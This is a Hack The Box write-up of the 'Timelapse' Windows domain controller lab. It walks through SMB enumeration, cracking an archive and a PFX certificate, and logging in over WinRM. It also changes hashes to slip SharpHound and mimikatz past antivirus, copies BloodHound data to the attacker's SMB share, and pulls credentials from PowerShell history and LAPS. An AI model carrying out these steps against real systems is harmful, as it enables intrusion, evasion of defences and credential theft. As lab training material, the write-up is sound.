# Timelapse Write-up - HTB

## Recon

Starting of with an nmap scan:

```ada
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-04-24 01:21:44Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-04-24T01:23:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
49719/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

We have a DC ahead!

## Enumeration

### SMB:

Null-session listing of SMB showed available "Share:

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

Listing it, we can see two folders inside:

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

## Footholding:

Interesting backup file, I tried checking what's up with it, but seems to be password protected:

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

I will start brute-forcing this in the background while I hunt for other entry points.

It was so quick, I didn't have time to tab-switch in bash!&#x20;

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

We extracted the contents and what's found is a .pfx file, let's crack it!

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

Running OpenSSL to extract the certificate and key:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private-key.pem -nodes -password pass:thuglegacy 
```

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.pem -password pass:thuglegacy
```

We are using these now to WinRM:

<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

## Lateral Movement

Running whoami /all to check privs:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

Trying to use SharpHound to map AD Permissions, but it seems there is some security controls in place.

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

Tried some barbarian method to fool the controls...&#x20;

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Time to bring out the BIG GUNZ! :gun:

Downloaded the SharpHound version of ps script.&#x20;

Added a random line to modify the hash value.

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

Encode it to base64.

```
cat SharpHound.ps1 | base64 > Lol.b64
```

Run a webserver to transfer.

Transfer the file and decode it back:

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Import the module:

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Running it:

```
Invoke-BloodHound -CollectionMethod Default -OutputDirectory C:\Users\legacyy\Documents
```

Transfer this back to our machine. Easiest path: using the smb share.

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

We have no access, so we will set-up an smb on our kali box.

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> Copy-Item "20250423202712_BloodHound.zip" -Destination "C:\Shares"
Access to the path 'C:\Shares\20250423202712_BloodHound.zip' is denied.
At line:1 char:1
+ Copy-Item "20250423202712_BloodHound.zip" -Destination "C:\Shares"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\legacy..._BloodHound.zip:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
```

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Let's now copy them:

```
copy 20250423202712_BloodHound.zip \\10.10.16.8\share\
copy NzcwYWNhMTEtODlmNS00OTNiLWEyNjAtZDQ2YjczY2QzMDk2.bin \\10.10.16.8\share\
```

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

Loaded up data in Bloodhound and looks like nothing for now.

Trying to move mimikatz on target system, but certutil blocks it? Modified the file as before to modify hash.

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Interesting enough with IWR it works!

<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

Tried to decode it, but hmm...:

<figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Eventually I realized I am chasing ghosts... Something I need to stop doing :) I should've had first run all internal recon.

Anyways running:

```
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-Content $historyPath
```

Reveals:

```
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
```

## Privilege Escalation

Now, let's use these creds to WinRM:

```
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

Bloodhound shows outbound permission:

<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

ReadLAPSPassword, game over.

Running:

```
Get-ADComputer -Identity "DC01" -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd
```

This will show us the password for Administrator account: 2nZ9eKj#30jek!1!ahj;0WO4

Now use them and get the flag!

<figure><img src="../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

